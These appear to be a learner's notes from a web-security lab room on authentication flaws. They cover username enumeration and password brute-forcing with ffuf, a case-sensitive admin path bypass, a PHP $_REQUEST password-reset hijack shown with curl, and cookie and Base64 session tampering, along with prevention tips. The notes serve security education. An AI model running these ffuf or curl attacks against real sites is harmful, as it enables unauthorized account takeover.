# Authentication Vulnerabilities

# 1. Username Enumeration

### What is it?

Before attacking a login page, an attacker first wants to know:

> **Which usernames actually exist?**

If the website tells us whether a username exists, that's called **username enumeration**.

### Example

Suppose the signup page says:

```
Username: admin
```

Response:

```
An account with this username already exists.
```

Now try:

```
Username: sai123xyz
```

Response:

```
Account created successfully.
```

What did we learn?

*  admin exists
*  sai123xyz doesn't exist

Without logging in, we already discovered a valid username.

This is an **information leak**.

------------

# ffuf (Fuzz Faster U Fool)

## What is ffuf?

**ffuf** is a **fast web fuzzing tool** used to automatically test many inputs against a web application.

Instead of sending requests manually, ffuf sends thousands of requests by replacing a placeholder (`FUZZ`) with values from a wordlist.

### Think of it like this

Without ffuf:

```
Username = admin
↓
Click Submit

Username = john
↓
Click Submit

Username = alice
↓
Click Submit
```

You repeat this hundreds or thousands of times.

With ffuf:

```
Wordlist
↓

admin
john
alice
guest
test

↓

ffuf

↓

Automatically sends every request
```

One command does all the work.

# What is Fuzzing?

**Fuzzing** means automatically testing many different inputs to see how an application responds.

Example:

```
Input 1 → admin
Input 2 → john
Input 3 → test
Input 4 → guest
Input 5 → random123
```

Instead of testing manually,

**ffuf tests all of them automatically.**


# Complete Command

```bash
ffuf \
-w /usr/share/wordlists/SecLists/Usernames/Names/names.txt \
-X POST \
-d "username=FUZZ&email=test@test.com&password=123456&cpassword=123456" \
-H "Content-Type: application/x-www-form-urlencoded" \
-u http://TARGET/customers/signup \
-mr "username already exists"
```

Now let's understand every part.


# 1. `ffuf`

Starts the program.

```
ffuf
```

Means

> Run the Fuzz Faster U Fool tool.

# 2. `-w`

## Meaning

```
Wordlist
```

This tells ffuf

> "Read usernames from this file."

Example

```
names.txt
```

contains

```
admin
john
alice
guest
```

ffuf reads

```
admin

↓

john

↓

alice

↓

guest
```

one by one.


# 3. `FUZZ`

This is a **placeholder**.

Whatever is written as

```
FUZZ
```

gets replaced with every word from the wordlist.

Template

```
username=FUZZ
```

becomes

First request

```
username=admin
```

The only thing changing is the value replacing `FUZZ`.

# 4. `-X POST`

Specifies the HTTP request method.

Most web forms use

```
POST
```

instead of

```
GET
```

So

```
-X POST
```

means

> Send POST requests.

Example

```
POST /customers/signup
```

# 5. `-d`

Means

```
Data
```

or

```
POST Body
```

Everything inside quotes is sent to the server.

```
username=FUZZ
email=test@test.com
password=123456
cpassword=123456
```

After replacing FUZZ

First request

```
username=admin
email=test@test.com
password=123456
cpassword=123456
```

Notice

Only the username changes.

Everything else stays the same.

# Why Give Fake Email and Password?

Because the website requires every field.

Example

```
Username
Email
Password
Confirm Password
```

If we leave email empty

```
Email Required
```

The request never reaches the username validation.

So we give fake values.

```
email=test@test.com

password=123456

cpassword=123456
```

Our goal isn't creating an account.

Our goal is checking usernames.

# 6. `-H`

Means

```
Header
```

Headers tell the server how to understand the request.

Here

```
Content-Type:
application/x-www-form-urlencoded
```

means

> "The data I'm sending is normal HTML form data."

Without this,

the server may reject the request or parse it incorrectly.


# 7. `-u`

Means

```
URL
```

Target website.

```
http://TARGET/customers/signup
```

Every generated request is sent here.

```
ffuf

↓

http://TARGET/customers/signup

↓

Response
```

---

# 8. `-mr`

Means

```
Match Response
```

ffuf searches every response for specific text.

Example

```
username already exists
```

If found

```
Display Result
```

Otherwise

Ignore it.

Example

```
Username = admin

↓

Response

Username already exists

↓

Displayed
```

# Example Output

```
admin
john
robert
```

These usernames likely already exist on the website


------------
# 3. Brute Force Attack

Now we know usernames.

Next step:

Guess passwords.

Instead of

```
1000 usernames
×

100 passwords
=
100,000 attempts
```

we now have

```
3 usernames

×

100 passwords

=

300 attempts
```

Much faster.


-------------

# Using ffuf for Password Enumeration (Credential Stuffing)



# Scenario

From the previous step, we found these valid usernames.

```text
admin
john
robert
```

These are saved in

```text
valid_usernames.txt
```

Now we use another wordlist containing common passwords.

```text
123456
password
admin123
qwerty
welcome
letmein
```

ffuf combines them and sends login requests.

# Complete Command

```bash
ffuf \
-w valid_usernames.txt:W1,\
/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 \
-X POST \
-d "username=W1&password=W2" \
-H "Content-Type: application/x-www-form-urlencoded" \
-u http://TARGET/customers/login \
-fc 200
```

# 1. `-w`

Unlike the previous command,

here **two wordlists** are used.

```bash
-w valid_usernames.txt:W1,\
/usr/share/wordlists/.../password-list.txt:W2
```

Meaning

| Wordlist            | Variable |
| ------------------- | -------- |
| valid_usernames.txt | W1       |
| password-list.txt   | W2       |

## First Wordlist (Usernames)

```text
admin
john
robert
```

Assigned to

```text
W1
```

## Second Wordlist (Passwords)

```text
123456
password
admin123
welcome
```

Assigned to

```text
W2
```

Think of it like variables.

```text
W1 = Username

W2 = Password
```

# 2. How ffuf Creates Requests

Suppose

Usernames

```text
admin
john
```

Passwords

```text
123456
password
```

Requests become

```text
username=admin
password=123456
```

↓

Next

```text
username=admin
password=password
```

```

It keeps trying combinations until the wordlists are exhausted (depending on ffuf's multi-wordlist mode).

# 3. `-X POST`

Specifies

```text
POST
```

because login forms usually use POST.

Example

```http
POST /customers/login
```

# 4. `-d`

Request body

```text
username=W1

password=W2
```

Before sending,

ffuf replaces

```text
W1

↓

admin
```

and

```text
W2

↓

123456
```

Actual request

```text
username=admin

password=123456
```

# 5. `-H`

Header

```text
Content-Type:
application/x-www-form-urlencoded
```

This tells the web server

> "I'm sending normal HTML form data."

Without this,

the login request may fail because the server doesn't know how to interpret the data.


# 6. `-u`

Target URL

```text
http://TARGET/customers/login
```

Every login request goes here.

# 7. `-fc`

## Meaning

**Filter Status Code**

```bash
-fc 200
```

Means

> Hide every response whose HTTP status code is **200**.


### Why filter 200?

Suppose the website behaves like this:

Wrong password

```http
HTTP/1.1 200 OK

Invalid username or password
```

Correct password

```http
HTTP/1.1 302 Found

Redirect: /dashboard
```

If every failed login returns **200**,

those responses aren't useful.

So

```bash
-fc 200
```

hides them.

Only unusual responses remain.



# Possible Output

```text
admin : admin123
```

or

```text
john : password
```

These are the credentials that likely worked because their responses differed from the filtered ones.

-----------

# Logic Flaws (Authentication) 

# What is a Logic Flaw?

A **Logic Flaw** is a vulnerability where the normal workflow of an application can be:

* Bypassed
* Circumvented *(avoided)*
* Manipulated *(changed for malicious purposes)*

Instead of exploiting coding mistakes like SQL Injection or XSS, the attacker abuses **the application's business logic** (the way the application is designed to work).

> **Simple Definition:**
> A Logic Flaw happens when a website trusts user actions too much, allowing attackers to perform actions that developers never intended.

# Real-Life Example

Imagine a shopping website.

### Normal Flow

```
Add Item
      ↓
Checkout
      ↓
Pay
      ↓
Order Confirmed
```

### Logic Flaw

An attacker changes the request and directly visits:

```
Order Confirmed
```

without paying.

The application failed because it didn't properly verify the previous steps.

# Example 1: Admin Authentication Bypass

Consider this code:

```javascript
if(url.substr(0,6) === "/admin"){

    // Check if user is admin

}else{

    // Show page

}
```

## What does this code do?

It checks whether the URL starts with:

```
/admin
```

If yes:

```
Check if user is admin
```

Otherwise:

```
Show the page
```

---

## Understanding the Code

### `url.substr(0,6)`

Means:

> Take the first **6 characters** of the URL.

Example:

```
URL

/admin

Characters:

/ a d m i n
1 2 3 4 5 6
```

Output:

```
/admin
```

---

### `===`

Triple equals means **exact comparison**.

It checks:

* Same letters
* Same capitalization *(uppercase/lowercase)*
* Same data type

Example:

```
"/admin" === "/admin"
```

 True

But

```
"/adMin" === "/admin"
```

 False

Because:

```
M ≠ m
```

# Where is the Logic Flaw?

The application only checks:

```
/admin
```

But **does not check**:

```
/adMin
```

or

```
/Admin
```

or

```
/ADMIN
```

Since the comparison is **case-sensitive** *(uppercase and lowercase letters are treated as different)*, these URLs do **not** match `/admin`.

So the code goes to the `else` block:

```javascript
else{

   View Page

}
```

No admin authentication is performed.

---

## Result

Instead of:

```
Check Admin
```

The application simply shows the page.

The attacker successfully bypasses authentication.

# Visual Flow

### Legitimate User

```
Visit /admin
        ↓
Admin Check
        ↓
Access Granted
```

---

### Attacker

```
Visit /adMin
        ↓
Comparison Fails
        ↓
Else Block
        ↓
Page Opens
```

---

# Why Did This Happen?

Because the developer assumed users would always request:

```
/admin
```

They forgot that URLs can be changed manually.

This is a **logic flaw**, not a programming syntax error.

---

# Practical Example – Password Reset Logic Flaw

Website:

```
Acme IT Support
```

Password Reset page asks for:

```
Email Address
```

Example:

```
robert@acmeitsupport.thm
```

If the email exists:

```
Go to Step 2
```

---

## Step 2

Website asks for:

```
Username
```

Example:

```
robert
```

After clicking **Check Username**, the website displays:

```
Password reset email will be sent to:

robert@acmeitsupport.thm
```

At first glance, everything appears secure because the attacker needs both the email and username.

---

# What Actually Happens?

The browser sends:

### GET Request *(query string – data in the URL)*

```
email=robert@acmeitsupport.thm
```

---

### POST Request *(form data sent in the request body)*

```
username=robert
```

---

## Curl Request 1

```bash
curl 'http://10.48.164.45/customers/reset?email=robert%40acmeitsupport.thm' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-d 'username=robert'
```

---

## Breaking Down the Command

### `curl`

Tool used to send HTTP requests from the terminal.

---

### URL

```text
http://10.48.164.45/customers/reset?email=robert%40acmeitsupport.thm
```

Contains:

```
GET parameter
```

```
email=robert@acmeitsupport.thm
```

---

### `-H`

Adds an HTTP header.

```bash
-H 'Content-Type: application/x-www-form-urlencoded'
```

This tells the server:

> "The request body contains form data."

---

### `-d`

Sends POST data.

```text
username=robert
```

---

# GET vs POST

| GET                         | POST                              |
| --------------------------- | --------------------------------- |
| Data is sent in the URL.    | Data is sent in the request body. |
| Visible in the browser URL. | Not visible in the URL.           |
| Used to retrieve data.      | Used to submit or modify data.    |

Example:

**GET**

```
?email=robert@acmeitsupport.thm
```

**POST**

```
username=robert
```

---

# The Vulnerability

The application later uses:

```php
$_REQUEST
```

instead of only using the GET parameter.

---

## What is `$_REQUEST`?

`$_REQUEST` is a PHP superglobal array that combines input from:

* `$_GET`
* `$_POST`
* `$_COOKIE`

This means it accepts data from multiple sources.

---

## Important Behavior

If both GET and POST contain the **same parameter name**, PHP gives **priority to the POST value**.

Example:

GET:

```
email=robert@acmeitsupport.thm
```

POST:

```
email=attacker@hacker.com
```

Then:

```php
$_REQUEST["email"]
```

returns:

```
attacker@hacker.com
```

**Why?** Because POST overrides the GET value when both use the same key.

---

# Exploiting the Logic Flaw

The attacker adds another POST parameter:

```
email=attacker@hacker.com
```

Now the request becomes:

```bash
curl 'http://10.48.164.45/customers/reset?email=robert%40acmeitsupport.thm' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-d 'username=robert&email=attacker@hacker.com'
```

---

## What the Server Sees

### GET

```
email=robert@acmeitsupport.thm
```

The application correctly identifies Robert's account.

---

### POST

```
username=robert
email=attacker@hacker.com
```

When sending the reset email, the application uses:

```php
$_REQUEST["email"]
```

Because POST takes priority, the reset email is sent to:

```
attacker@hacker.com
```

instead of Robert's real email.

---

# Attack Flow

```
Attacker enters Robert's email
              ↓
Website finds Robert's account
              ↓
Attacker injects another email in POST
              ↓
$_REQUEST chooses POST email
              ↓
Password reset link goes to attacker
              ↓
Attacker gains access to Robert's account
```

---

# Why Is This a Logic Flaw?

The application correctly identifies Robert's account but later trusts user-controlled POST data when deciding where to send the reset email.

The flaw is not in authentication itself—it is in the application's logic for handling request parameters.

---

# How to Prevent This Vulnerability

* Never mix GET and POST parameters for sensitive actions.
* Avoid using `$_REQUEST` for security-critical operations.
* Use `$_GET` or `$_POST` explicitly, depending on the expected input.
* Always send password reset emails only to the email address stored in the database, **not** to any email supplied by the user.
* Validate every step of the password reset process.

---

# Key Takeaways

* A **Logic Flaw** is a weakness in the application's workflow rather than a coding bug.
* Attackers exploit how the application is designed to behave.
* `===` performs an exact, case-sensitive comparison.
* `$_REQUEST` combines data from GET, POST, and COOKIE.
* When the same parameter exists in both GET and POST, **POST usually takes priority**.
* Never trust user-supplied input for security-sensitive operations like password resets.

---

# Quick Revision

| Topic         | Remember                                                                                   |
| ------------- | ------------------------------------------------------------------------------------------ |
| Logic Flaw    | Abuse of application workflow or business logic.                                           |
| `===`         | Exact, case-sensitive comparison.                                                          |
| `substr(0,6)` | Reads the first 6 characters of a string.                                                  |
| GET           | Data in the URL (query string).                                                            |
| POST          | Data in the request body (form data).                                                      |
| `curl`        | Command-line tool to send HTTP requests.                                                   |
| `-H`          | Adds an HTTP header.                                                                       |
| `-d`          | Sends POST data.                                                                           |
| `$_REQUEST`   | Combines GET, POST, and COOKIE data.                                                       |
| Vulnerability | POST email overrides GET email, causing the reset link to be sent to the attacker's email. |

---

# Interview Questions

### 1. What is a Logic Flaw?

A vulnerability where an attacker bypasses or manipulates the intended workflow of an application instead of exploiting a coding bug.

---

### 2. Why is using `$_REQUEST` risky?

Because it accepts data from multiple sources (GET, POST, COOKIE), allowing attackers to override expected values.

---

### 3. Why is `===` important in the admin example?

It performs a case-sensitive exact comparison, so URLs like `/adMin` do not match `/admin`, potentially bypassing security checks if the application logic is flawed.

---

### 4. What is the main vulnerability in the password reset example?

The application identifies the correct user using the GET parameter but sends the reset email using `$_REQUEST`, allowing an attacker to override the destination email through POST data.

---

### 5. How can developers prevent this vulnerability?

By using explicit request sources (`$_GET` or `$_POST`), validating all inputs, and always sending reset emails only to the email address stored in the database.


----------------
# 6. Cookies

A cookie is just information stored in your browser.

Example:

```
logged_in=true
```

means

```
User logged in
```

Another:

```
admin=false
```

means

```
Normal user
```

---

Server sends

```
logged_in=true

admin=false
```

Browser stores them.

---

If there is no integrity check and you change:

```
admin=true
```

The server may believe you are an administrator.

---

Example

```
Before

logged_in=true

admin=false

↓

User
```

After editing

```
logged_in=true

admin=true

↓

Admin
```

This is why sensitive information should never be trusted directly from client-side cookies.

---

# 7. Hashing

Hashing converts data into a fixed-length value.

Example

```
hello
```

↓

MD5

```
5d41402abc4b2a76b9719d911017c592
```

You cannot directly reverse a secure hash to get the original text.

---

Why use hashes?

Instead of storing

```
password123
```

Store

```
482c811da5d5b4bc6d497ffa98491e38
```

If the database leaks, passwords aren't stored in plain text.

---

# 8. Encoding

Encoding is **not security**.

It simply changes the format of data so it can be safely transmitted or stored.

Example:

```
Hello
```

↓

Base64

```
SGVsbG8=
```

Anyone can decode it back to:

```
Hello
```

---

### Example from the room

Cookie:

```
session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==
```

Base64 decode gives:

```json
{
"id":1,
"admin":false
}
```

If the application trusts this value without protection, changing it to:

```json
{
"id":1,
"admin":true
}
```

and re-encoding it could incorrectly grant administrator access.

---

# Quick Revision

| Concept              | Simple Meaning                                                       |
| -------------------- | -------------------------------------------------------------------- |
| Username Enumeration | Finding valid usernames by observing website responses               |
| Brute Force          | Trying many passwords automatically                                  |
| ffuf                 | Tool to automate enumeration and brute-force attacks                 |
| Logic Flaw           | Mistake in application logic that bypasses security                  |
| Password Reset Flaw  | Redirecting a reset email by manipulating request parameters         |
| Cookie Manipulation  | Editing insecure client-side cookies to change privileges            |
| Hashing              | One-way transformation used to verify data (e.g., passwords)         |
| Encoding             | Reversible transformation used for data representation, not security |

These are common authentication weaknesses that penetration testers learn to identify during authorized security assessments, and understanding them will also help you recognize how developers can prevent them.
